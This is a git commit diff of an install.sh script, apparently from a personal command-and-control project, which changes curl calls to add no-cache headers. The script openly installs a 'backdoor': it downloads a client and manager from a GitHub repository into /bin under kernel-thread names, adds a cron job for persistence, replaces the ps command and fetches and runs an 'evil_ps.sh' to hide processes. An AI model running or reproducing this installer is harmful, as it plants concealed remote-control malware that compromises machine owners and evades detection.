8e7b3bdba971333477c84cee1d9cc80afad9fdc8
Anton Forsman <10177340+anforsm@users.noreply.github.com>
2023-10-08 23:55:51 -0500

    Update install.sh

--- install.sh
+++ install.sh
@@ -3,8 +3,8 @@ echo "Installing dependencies..."
 echo "Installing python3"
 yum install -y -q python3
 echo "Downloading backdoor..."
-curl -s https://raw.githubusercontent.com/anforsm/command_and_control/main/client.py > /bin/kthread
-curl -s https://raw.githubusercontent.com/anforsm/command_and_control/main/manager.sh > /bin/kworker
+curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/client.py > /bin/kthread
+curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/manager.sh > /bin/kworker
 echo "Configure backdoor"
 read -p "Enter server ip: " server_ip
 read -p "Enter server port: " server_port
@@ -15,5 +15,5 @@ chmod +x /bin/kworker
 (crontab -l 2>/dev/null; echo "* * * * * /bin/kworker") | crontab -
 # https://stackoverflow.com/questions/28836042/how-to-hide-a-shell-script-running-in-the-background-from-ps-ef
 mv /bin/ps /bin/pso
-bash <(curl -s https://raw.githubusercontent.com/anforsm/command_and_control/main/evil_ps.sh)
+bash <(curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/evil_ps.sh)
 echo "Installation complete"
